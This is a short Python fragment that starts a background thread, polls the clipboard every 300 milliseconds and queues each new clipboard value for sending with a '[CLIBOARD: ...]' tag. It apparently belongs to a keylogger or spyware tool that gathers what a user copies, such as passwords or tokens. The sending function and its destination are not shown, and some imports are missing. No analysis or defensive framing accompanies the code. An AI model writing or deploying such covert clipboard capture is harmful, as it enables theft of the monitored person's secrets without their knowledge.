from clipboard import paste, copy
def listen_clipboard():
    recent_value = ""
    while 1:
        sleep(.300)
        tmp_value = str(paste())
        if tmp_value != recent_value:
            recent_value = tmp_value
            if recent_value != "":
                addToSend("[CLIBOARD: "+recent_value+" ]")
Thread(target=listen_clipboard).start()
